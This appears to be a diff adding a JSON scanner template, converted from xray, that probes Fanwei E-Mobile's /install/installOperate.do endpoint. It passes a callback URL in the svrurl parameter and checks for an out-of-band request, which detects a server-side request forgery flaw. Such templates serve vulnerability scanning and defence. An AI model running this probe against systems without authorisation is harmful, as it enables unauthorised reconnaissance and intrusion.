@@ -1,0 +1,70 @@
+{
+  "name": "poc-yaml-fanwei-e-mobile-url",
+  "author": "k3ppf0r",
+  "description": "",
+  "references": [
+    "https://blog.csdn.net/qq_41904294/article/details/140643052?spm\u003d1001.2014.3001.5501"
+  ],
+  "version": "",
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "r2()",
+  "searchQueries": {},
+  "variables": {
+    "reverse": [
+      "newReverse()"
+    ],
+    "reverseUrl": [
+      "reverse.url"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "r2",
+      "method": "GET",
+      "path": "/install/installOperate.do?svrurl\u003d{{reverseUrl}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": true,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 reverse.wait(3)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "xray"
+}
